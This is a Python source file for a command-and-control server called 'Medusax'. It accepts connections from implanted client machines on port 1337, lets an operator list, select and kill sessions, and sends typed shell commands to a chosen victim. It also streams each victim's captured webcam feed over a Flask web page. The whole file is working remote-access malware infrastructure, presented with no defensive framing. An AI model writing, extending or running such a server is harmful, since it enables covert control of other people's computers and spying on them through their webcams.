# medusax_c2_server.py
import socket
import threading
import os
from flask import Flask, Response
import time

clients = {}
sessions = {}
webcam_data = {}

app = Flask(__name__)

@app.route('/webcam/<session_id>')
def stream(session_id):
    def generate():
        while True:
            if session_id in webcam_data:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + webcam_data[session_id] + b'\r\n')
            time.sleep(0.1)
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

def handle_client(conn, addr, session_id):
    sessions[session_id] = conn
    print(f"[+] Session {session_id} started from {addr}")
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                break
            if data.startswith(b'WEBCAM:'):
                webcam_data[session_id] = data[7:]
            else:
                print(f"[Session {session_id}] {data.decode(errors='ignore')}")
        except:
            break
    print(f"[-] Session {session_id} disconnected")
    del sessions[session_id]
    conn.close()

def accept_clients(server):
    session_id = 0
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr, session_id)).start()
        clients[session_id] = addr
        session_id += 1

HOST = '0.0.0.0'
PORT = 1337
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)
threading.Thread(target=accept_clients, args=(server,), daemon=True).start()
print("[+] Server started. Listening for connections...")

@app.route('/')
def index():
    return '<h1>Medusax C2 Webcam Server</h1>'

threading.Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': 8080}, daemon=True).start()

current_session = None

while True:
    try:
        cmd = input("admin@medusax~$ ").strip()
        if cmd == "sessions":
            for sid, addr in clients.items():
                print(f"Session {sid}: {addr}")
        elif cmd.startswith("sessions -i"):
            sid = int(cmd.split()[-1])
            if sid in sessions:
                current_session = sid
                print(f"[+] Interacting with session {sid}")
            else:
                print("[-] Invalid session ID")
        elif cmd == "background":
            current_session = None
        elif cmd.startswith("sessions -k"):
            sid = int(cmd.split()[-1])
            if sid in sessions:
                sessions[sid].close()
                print(f"[+] Session {sid} killed")
        elif cmd == "sessions -K":
            for sid in list(sessions.keys()):
                sessions[sid].close()
                print(f"[+] Session {sid} killed")
        elif current_session is not None:
            sessions[current_session].send(cmd.encode())
        else:
            print("[-] No session selected. Use 'sessions -i <id>' to interact.")
    except KeyboardInterrupt:
        break
    except Exception as e:
        print(f"Error: {e}")
